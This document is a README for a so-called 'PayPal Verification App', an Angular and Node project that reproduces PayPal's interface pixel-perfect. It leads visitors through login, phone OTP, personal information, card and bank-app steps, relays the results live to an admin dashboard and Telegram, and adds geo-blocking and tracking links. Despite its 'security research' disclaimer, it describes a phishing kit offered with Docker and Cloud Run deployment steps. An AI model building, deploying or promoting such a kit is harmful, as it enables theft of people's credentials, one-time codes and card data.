# PayPal Verification App 🛡️

A state-of-the-art, high-fidelity Angular application simulating PayPal's security verification flow. Built with production-grade security, comprehensive testing, and enterprise-level architecture.

[![Security Scan](https://github.com/your-repo/paypal-verifier/actions/workflows/security.yml/badge.svg)](https://github.com/your-repo/paypal-verifier/actions/workflows/security.yml)
[![Test Coverage](https://codecov.io/gh/your-repo/paypal-verifier/branch/main/graph/badge.svg)](https://codecov.io/gh/your-repo/paypal-verifier)
[![Docker Image](https://img.shields.io/docker/pulls/your-repo/paypal-verifier)](https://hub.docker.com/r/your-repo/paypal-verifier)

## 🚀 Features

### Core Functionality
- **High-Fidelity UI**: Pixel-perfect PayPal interface reproduction
- **Multi-Stage Verification**: Login → Phone OTP → Personal Info → Card Validation → Bank App
- **Real-Time Monitoring**: Live admin dashboard with Socket.IO
- **Session Persistence**: Resume incomplete sessions across devices
- **Multi-Language Support**: 19 languages including Arabic, Chinese, Spanish

### Security & Compliance
- **Advanced Security**: XSS protection, CSP headers, input sanitization
- **Geo-Blocking**: Country-based access control per admin
- **Audit Logging**: Complete audit trail with Winston structured logging
- **Rate Limiting**: Express rate limiting with Redis backing
- **Input Validation**: Zod schema validation + express-validator

### Enterprise Features
- **Multi-Admin System**: Role-based access (Admin/Hypervisor)
- **Telegram Integration**: Automated notifications for verification events
- **Link Tracking**: Personalized tracking links with analytics
- **Impersonation**: Hypervisor can impersonate admin accounts
- **Link Tracking**: Personalized tracking links with analytics
- **Impersonation**: Hypervisor can impersonate admin accounts
- **Database Flexibility**: SQLite (dev) + PostgreSQL (prod) support
- **A/B Testing**: Native traffic splitting and variant optimization
- **Custom Theming**: Per-link branding customization
- **Admin Guide**: Comprehensive [Admin Documentation](docs/admin_guide.md)

## 🏗️ Architecture

### Tech Stack
- **Frontend**: Angular 18 + TypeScript + Tailwind CSS + Signals
- **Backend**: Node.js 22 + Express + Socket.IO + Winston
- **Database**: PostgreSQL/SQLite with Prisma-like abstraction
- **Security**: Helmet, express-rate-limit, express-validator, Zod
- **Testing**: Jest + Supertest + Playwright
- **Deployment**: Docker + Kubernetes + Cloud Run

### System Components
```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   User Client   │◄──►│   Express API   │◄──►│   PostgreSQL    │
│   (Angular)     │    │   (Node.js)     │    │   Database       │
└─────────────────┘    └─────────────────┘    └─────────────────┘
         │                       │                       │
         ▼                       ▼                       ▼
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   Admin Client  │◄──►│   Socket.IO     │◄──►│   Redis Cache    │
│   (Dashboard)   │    │   Real-time     │    │   (Sessions)     │
└─────────────────┘    └─────────────────┘    └─────────────────┘
```

## 🚀 Quick Start

### Prerequisites
- Node.js 18+
- Docker & Docker Compose
- PostgreSQL (optional, SQLite fallback)

### Quick Setup
1. Install dependencies: `npm install`
2. Run the wizard: `node scripts/setup-wizard.js`
3. Start the server: `npm start`

See [DEPLOYMENT.md](DEPLOYMENT.md) for detailed Docker and Production instructions.

4. **Access Application**
- User Interface: http://localhost:4200
- Admin Dashboard: http://localhost:4200/admin
- API Documentation: http://localhost:8080/api-docs

### Production Deployment

#### Docker Deployment
```bash
# Build and run
docker build -t paypal-verifier .
docker run -p 8080:8080 --env-file .env paypal-verifier
```

#### Docker Compose (Full Stack)
```bash
# Production deployment with PostgreSQL and Redis
docker-compose -f docker-compose.prod.yml up -d
```

#### Google Cloud Run
```bash
# Enable services
gcloud services enable cloudbuild.googleapis.com run.googleapis.com

# Build and deploy
gcloud builds submit --tag gcr.io/$(gcloud config get-value project)/paypal-verifier
gcloud run deploy paypal-verifier \
  --image gcr.io/$(gcloud config get-value project)/paypal-verifier \
  --platform managed \
  --region us-central1 \
  --allow-unauthenticated \
  --memory 1Gi \
  --cpu 1 \
  --max-instances 10
```

#### Kubernetes
```bash
# Apply Kubernetes manifests
kubectl apply -f k8s/

# Check deployment
kubectl get pods
kubectl logs -f deployment/paypal-verifier
```

## 🧪 Testing

### Run Test Suite
```bash
# All tests
npm test

# With coverage
npm run test:coverage

# E2E tests
npm run test:e2e

# Security tests
npm run test:security
```

### Test Categories
- **Unit Tests**: Component and service testing
- **Integration Tests**: API endpoint testing
- **E2E Tests**: Full user journey testing
- **Security Tests**: Vulnerability and penetration testing
- **Performance Tests**: Load and stress testing

## 🔒 Security

### Security Features
- **Input Validation**: Comprehensive input sanitization and validation
- **Rate Limiting**: Distributed rate limiting with Redis
- **CSP Headers**: Content Security Policy implementation
- **XSS Protection**: DOM-based XSS prevention
- **Audit Logging**: Complete audit trail for compliance
- **Geo-Blocking**: Country-based access control
- **Session Security**: Secure session management and timeout

### Security Scanning
```bash
# Run security scan
npm run security:check

# Docker security scan
./scripts/docker-security-scan.sh

# Dependency vulnerability check
npm audit --audit-level high
```

## 📊 Monitoring & Observability

### Health Checks
- **Application Health**: `/api/health`
- **Database Health**: `/api/health/db`
- **Metrics Endpoint**: `/api/metrics`

### Logging
- **Structured Logging**: Winston with JSON format
- **Log Levels**: error, warn, info, debug
- **Log Rotation**: Daily rotation with compression
- **Centralized Logging**: ELK stack integration ready

### Metrics
- **Response Times**: Request duration tracking
- **Error Rates**: Application error monitoring
- **Session Metrics**: Active session counts
- **Security Events**: Suspicious activity alerts

## 📚 Documentation

### API Documentation
- **OpenAPI Spec**: `docs/api.yaml`
- **Interactive Docs**: Swagger UI at `/api-docs`
- **Postman Collection**: `docs/postman_collection.json`

### Developer Guides
- **Architecture**: `docs/architecture.md`
- **Security**: `docs/security.md`
- **Deployment**: `docs/deployment.md`
- **Contributing**: `CONTRIBUTING.md`

## 🔧 Configuration

### Environment Variables
```bash
# Application
NODE_ENV=production
PORT=8080

# Database
DATABASE_URL=postgresql://user:pass@localhost:5432/paypal_verifier

# Security
JWT_SECRET=your-super-secret-key
BCRYPT_ROUNDS=12

# Telegram
TELEGRAM_BOT_TOKEN=your-bot-token
TELEGRAM_CHAT_ID=your-chat-id

# Redis (for rate limiting)
REDIS_URL=redis://localhost:6379

# Logging
LOG_LEVEL=info
LOG_LEVEL=info
LOG_FILE=logs/app.log

# Gatekeeper (Admin Access)
HYPERVISOR_USERNAME=admin
HYPERVISOR_PASSWORD=secure-password
DB_SSL_REJECT_UNAUTHORIZED=true
```

### Admin Configuration
- **Default Admin**: Set via `ADMIN_USERNAME` / `ADMIN_PASSWORD` environment variables
- **Hypervisor**: Set via `HYPERVISOR_USERNAME` / `HYPERVISOR_PASSWORD` environment variables  
- **Role-based Access**: Admin vs Hypervisor permissions
- **Security Note**: Never commit real credentials. Use environment variables or secrets management.

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

### Development Workflow
```bash
# Install dependencies
npm install

# Run linter
npm run lint

# Run tests
npm test

# Build for production
npm run build

# Security check
npm run security:check
```

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## ⚠️ Disclaimer

This application is a simulation tool for security research and educational purposes. It should not be used for any illegal activities or to impersonate PayPal or any other financial institution.

## 🆘 Support

- **Documentation**: [docs/](docs/)
- **Issues**: [GitHub Issues](https://github.com/your-repo/paypal-verifier/issues)
- **Discussions**: [GitHub Discussions](https://github.com/your-repo/paypal-verifier/discussions)
- **Security**: security@example.com

---

**Built with ❤️ for security research and education**
